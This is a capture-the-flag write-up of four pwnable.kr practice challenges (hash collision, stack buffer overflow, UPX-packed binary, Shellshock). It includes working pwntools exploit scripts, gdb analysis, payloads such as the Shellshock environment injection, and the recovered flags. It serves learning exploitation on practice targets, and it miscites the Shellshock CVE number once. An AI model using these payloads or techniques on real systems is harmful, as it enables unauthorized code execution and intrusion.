# Empiricism
 
Writeups of few ezpz challenges from pwnable.kr, super fun.<br />

Files can be downloaded at : http://pwnable.kr/play.php <br />

## Collision

This challenge is about (MD5) hash collision, here is the C code:

```c
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

We would like to produce a 20 bytes hash with the following value : 0x21DD09EC <br />

```
0x21DD09EC = 568134124

0x1010101 * 4 = 0x4040404 <=> '\x01'*16 (16/20 bytes)

0x4040404 = 67372036 
 
568134124 - 67372036 = 0x1DD905E8 (4/20 bytes)

0x21DD09EC = 0x4040404 + 0x1DD905E8 

./col "`python -c "print '\x01'*16 + '\xE8\x05\xD9\x1D'"`"
```

Let's craft an exploit with python/pwntools:

```python
from pwn import *

payload = p32(0x1010101)*4 + p32(0x1DD905E8)

conn = ssh(host='pwnable.kr', user='col', password='guest', port=2222)
p = conn.process(executable='./col', argv=['col', payload])
p.interactive()
```

Output from script is:

```
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn't check security settings on 'pwnable.kr'
[+] Starting remote process bytearray(b'./col') on pwnable.kr: pid 389795
[*] Switching to interactive mode
daddy! I just managed to create a hash collision :)
[*] Got EOF while reading in interactive
```

Flag in the bag !

```
daddy! I just managed to create a hash collision :)
```

## Bof

Let's pwn some buffer, here is the C code:

```c
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

We would like to modify key's value that is being used in func() from the main function, it means that we would like to overwrite the stack pointer (esp). <br />

In some cases, it's not the stack pointer that we wish to overwrite but the instruction pointer (eip).<br />

Anyways, we control overflowme but not key. Let's overflow this array so we could overwrite key's value : from "0xdeadbeef" to "0xcafebabe".<br />

From here, we should be able to spawn a shell and retrieve the flag.

```
└─$ gdb ./bof

gef➤  disas func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   ebp
   0x5655562d <+1>:     mov    ebp,esp
   0x5655562f <+3>:     sub    esp,0x48
   0x56555632 <+6>:     mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:    xor    eax,eax
   0x5655563d <+17>:    mov    DWORD PTR [esp],0x5655578c
   0x56555644 <+24>:    call   0xf7e3c1e0 <puts>
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0xf7e3b6f0 <gets>
   0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    mov    DWORD PTR [esp],0x5655579b
   0x56555664 <+56>:    call   0xf7e10370 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    mov    DWORD PTR [esp],0x565557a3
   0x56555672 <+70>:    call   0xf7e3c1e0 <puts>
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7ee1700 <__stack_chk_fail>
   0x56555688 <+92>:    leave
   0x56555689 <+93>:    ret
```

Let's put a breakpoint just before the comparison between key's value and "0xcafebabe"

```
0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
```

For now, we don't want to crash the program but calculate offset between overflowme and 0xdeadbeef (current key value).

```
gef➤  b *func+40                                                   
Breakpoint 1 at 0x654                                              
gef➤  r                                                            
overflow me :                                                      
AAAAAAAAAAAA (12 'A')                                                     
```

```
gef➤  x/50xw $esp
0xffffd120:     0xffffd13c      0x00000534      0x0000003c      0xf7fb5224
0xffffd130:     0x00000000      0xf7fb7000      0xf7ffc7e0      0x41414141
0xffffd140:     0x41414141      0x41414141      0x00000000      0x5655549d
0xffffd150:     0xf7fb73fc      0x00040000      0x56556ff4      0x7dde8700
0xffffd160:     0x56556ff4      0xf7fb7000      0xffffd188      0x5655569f
0xffffd170:     0xdeadbeef      0x00000000      0x565556b9      0x00000000
0xffffd180:     0xf7fb7000      0xf7fb7000      0x00000000      0xf7de9ee5
0xffffd190:     0x00000001      0xffffd224      0xffffd22c      0xffffd1b4
0xffffd1a0:     0xf7fb7000      0x00000000      0xffffd208      0x00000000
0xffffd1b0:     0xf7ffd000      0x00000000      0xf7fb7000      0xf7fb7000
0xffffd1c0:     0x00000000      0xc4b612df      0x862874cf      0x00000000
0xffffd1d0:     0x00000000      0x00000000      0x00000001      0x56555530
0xffffd1e0:     0x00000000      0xf7fe7ad4
```

0x41414141 = 4 bytes (1 word)<br />

We can deduce that the offset is 52 bytes. How? Because we have already written 12 'A' (12 bytes) and there is still this data to overwrite (between the last 0x414141 and 0xdeadbeef)

```
0x00000000      0x5655549d
0xf7fb73fc      0x00040000      0x56556ff4      0x7dde8700
0x56556ff4      0xf7fb7000      0xffffd188      0x5655569f
```

12 'A' + 10 words = 12 bytes + 40 bytes = 52 bytes <br />

And now, just got to craft an exploit:

```python
from pwn import *

conn = remote('pwnable.kr', 9000)

payload = b'A' * 52
payload += p32(0xcafebabe) #b'\xbe\xba\xfe\xca'

conn.sendline(payload)
conn.sendline(b'/bin/cat flag')

flag = conn.recv()
print(flag)

conn.close()
```

Output from the script is :

```
[x] Opening connection to pwnable.kr on port 9000
[x] Opening connection to pwnable.kr on port 9000: Trying 128.61.240.205
[+] Opening connection to pwnable.kr on port 9000: Done
b'daddy, I just pwned a buFFer :)\n'
[*] Closed connection to pwnable.kr port 9000
```

Flag in the bag !

```
daddy, I just pwned a buFFer :)
```

## Flag

This is the only challenge (amongst the four) without code, only binary.

```
└─$ file flag
flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
```

```
└─$ strings flag | less
UPX!
[...]
```

UPX is a packer for executables, we could install upx package, then decompress the binary, and finally look at the binary with gdb. <br />

Another solution is to set a catchpoint at a syscall and generate a core file.

```
└─$ strace ./flag

[...]
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fdc8b0b3000
write(1, "I will malloc() and strcpy the f"..., 52I will malloc() and strcpy the flag there. take it.
) = 52
exit_group(0)                           = ?
```

Let's set a catchpoint at the end of the program (exit_group func) and generate a core file.

```
└─$ gdb ./flag

gef➤ catch syscall exit_group
Catchpoint 1 (syscall 'exit_group' [231])

gef➤ r

gef➤ generate-core-file core-flag
Saved corefile core-flag

gef➤ quit

└─$ strings -n 21 core-flag | less
UPX...? sounds like a delivery service :)
[...]
```

Flag in the bag !

```
UPX...? sounds like a delivery service :)
```

Original idea from : [Walkthrough of flag level in pwnable.kr](https://www.youtube.com/watch?v=l7dPPmVeRDw)


## Shellshock


GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment.

```
shellshock@pwnable:~$ bash --version
GNU bash, version 4.3.48(1)-release (x86_64-pc-linux-gnu)
```

Bash, in this case, is vulnerable to CVE-2014-761, here is the C code:
```c
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

From wikipedia, you can get the correct string format, just got to translate it afterwards

```c
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

```c
env y='() { :;}; /bin/cat /home/shellshock/flag' ./shellshock"
```

Pretty straight forward from here, we can build an exploit:

```python
from pwn import *

conn = ssh(host='pwnable.kr', user='shellshock', password='guest', port=2222)
sh = conn.shell();

res = sh.recvuntil(b'$')
sh.sendline(b"env x='() { :;}; /bin/cat /home/shellshock/flag' ./shellshock")
res = sh.recvuntil(b'$')

print("\n")
print(res)
print("\n")

sh.close()
conn.close()

```

Output from script is:
```
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn't check security settings on 'pwnable.kr'
[+] Opening new channel: 'shell': Done


b" env x='() { :;}; /bin/cat /home/shellshock/flag' ./shellshock\r\nonly if I knew CVE-2014-6271 ten years ago..!!\r\nSegmentation fault (core dumped)\r\nshellshock@pwnable:~$"


[*] Closed SSH channel with pwnable.kr
[*] Closed connection to 'pwnable.kr'
```

Flag in the bag !

```
only if I knew CVE-2014-6271 ten years ago..!!
```

